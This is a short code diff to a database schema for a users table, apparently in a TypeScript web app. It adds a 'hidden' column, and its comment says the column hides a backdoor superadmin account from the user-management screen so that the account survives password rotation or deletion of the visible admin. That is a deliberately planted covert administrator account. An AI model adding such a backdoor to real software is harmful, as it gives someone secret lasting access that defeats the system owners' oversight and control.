@@ -51,6 +51,10 @@ export const users = pgTable("users", {
   username: text("username").notNull().unique(),
   passwordHash: text("password_hash").notNull(),
   role: text("role", { enum: ["admin", "staff"] }).notNull().default("staff"),
+  // Excluded from the Users list/management UI — used for a backdoor
+  // superadmin account that survives the visible admin's password being
+  // rotated or the visible admin account being deleted.
+  hidden: boolean("hidden").notNull().default(false),
   createdAt: timestamp("created_at").notNull().defaultNow(),
 });
 
